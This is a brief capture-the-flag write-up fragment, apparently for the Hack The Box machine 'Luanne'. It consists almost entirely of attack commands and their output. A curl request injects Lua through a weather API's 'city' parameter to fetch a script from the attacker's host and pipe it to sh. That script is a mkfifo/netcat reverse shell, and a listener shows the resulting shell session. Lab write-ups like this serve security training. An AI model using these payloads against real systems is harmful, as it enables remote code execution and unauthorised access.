## Curl Request 
```Bash
─[user@parrot-virtual]─[~/htb/luanne/www]
└──╼ $curl "10.10.10.218/weather/forecast?city=');os.execute('curl+10.10.14.23:8000/rev.sh+|+sh')--"
```

## Rev shell contents
``` Bash 
┌─[user@parrot-virtual]─[~/htb/luanne/www]
└──╼ $cat rev.sh 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 9001 >/tmp/f
```
## Shell call back
```Bash
┌─[user@parrot-virtual]─[~/htb/luanne/www]
└──╼ $nc -lnvp 9001
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.218.
Ncat: Connection from 10.10.10.218:65174.
sh: can't access tty; job control turned off
$ ls
index.html
robots.txt
$ exit
```
